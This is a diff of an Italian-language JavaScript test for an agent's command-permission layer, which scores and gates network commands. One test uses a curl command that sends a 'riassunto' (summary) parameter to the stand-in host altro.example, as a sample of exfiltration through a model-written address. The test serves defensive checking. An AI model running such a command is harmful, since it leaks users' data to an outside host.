@@ -118,10 +118,10 @@ test('un comando che va in rete passa dallo stesso controllo di NAVIGA: dopo tes
 test('curl verso un indirizzo scritto dal modello: costo 3, a Normale chiede anche a compito pulito', () => {
   const curl = { type: 'ESEGUI_COMANDO', comando: 'curl https://altro.example/?d=riassunto' };
   assert.equal(AL.costoFor(curl), 2);
-  assert.equal(risposta(curl), 'si', 'senza il verdetto della porta parte come prima');
+  assert.equal(risposta(curl, { guardiano: true }), 'si', 'senza il verdetto della porta parte come prima');
   const scritto = { ...curl, _nonCompare: true };
   assert.equal(AL.costoFor(scritto), 3);
-  assert.equal(risposta(scritto), 'chiede');
+  assert.equal(risposta(scritto, { guardiano: true }), 'chiede');
   assert.match(AL.describe(scritto), /indirizzo scritto a memoria da Filo, che non compare da nessuna parte/);
   assert.equal(AL.costoFor({ ...curl, _exfil: true, _exfilReason: 'contiene un blocco di dati codificato' }), 2, 'un dato nell\'indirizzo alza come per NAVIGA');
   assert.match(AL.describe({ ...curl, _exfil: true, _exfilReason: 'contiene un blocco di dati codificato' }), /indirizzo che contiene un blocco di dati codificato/);
